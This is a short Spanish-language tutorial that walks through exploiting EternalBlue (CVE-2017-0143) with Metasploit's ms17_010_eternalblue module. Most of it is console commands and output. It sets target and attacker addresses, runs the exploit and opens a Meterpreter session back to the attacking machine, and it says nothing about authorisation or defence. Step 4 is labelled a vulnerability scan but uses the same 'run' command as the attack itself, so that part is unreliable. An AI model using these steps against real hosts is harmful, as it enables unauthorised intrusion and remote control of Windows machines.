# Explotación de EternalBlue en Windows con Metasploit

En este tutorial, veremos cómo aprovechar la vulnerabilidad **EternalBlue** (CVE-2017-0143) para comprometer una máquina Windows usando `Metasploit`.

### 1. Iniciar Metasploit

El primer paso es iniciar la base de datos de Metasploit y abrir la consola:

```bash
$ sudo msfdb init && msfconsole
```

### 2. Buscar y seleccionar el exploit para EternalBlue

Para encontrar el exploit específico de EternalBlue en la base de datos de `Metasploit`, buscamos el ID de vulnerabilidad CVE-2017-0143:

```bash
msf6 > search CVE:CVE-2017-0143
```

Seleccionamos el exploit correspondiente a **EternalBlue**.

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

### 3. Configurar los parámetros del exploit

Una vez seleccionado el exploit, debemos configurar los parámetros necesarios, como la dirección IP de nuestra máquina (LHOST) y la dirección IP del objetivo (RHOST).

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.25  # IP de la máquina objetivo
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.18    # IP de nuestra máquina atacante
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444            # Puerto a utilizar
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options  # Verificar configuración.
```

### 4. Ejecutar el escaneo de vulnerabilidad

Antes de ejecutar el exploit, realizamos un escaneo para confirmar si la máquina objetivo es vulnerable.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

Si el sistema objetivo es vulnerable, deberías ver un mensaje indicando que está listo para ser explotado:

```bash
[*] 192.168.1.25:445 - The target is vulnerable.
```

### 5. Ejecutar el exploit y obtener una sesión

Finalmente, ejecutamos el exploit para abrir una sesión `meterpreter` en la máquina comprometida:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

Si todo sale bien, recibirás una sesión de `meterpreter`:

```bash
[*] Meterpreter session 1 opened (192.168.1.18:4444 -> 192.168.1.25:49159)
```

***
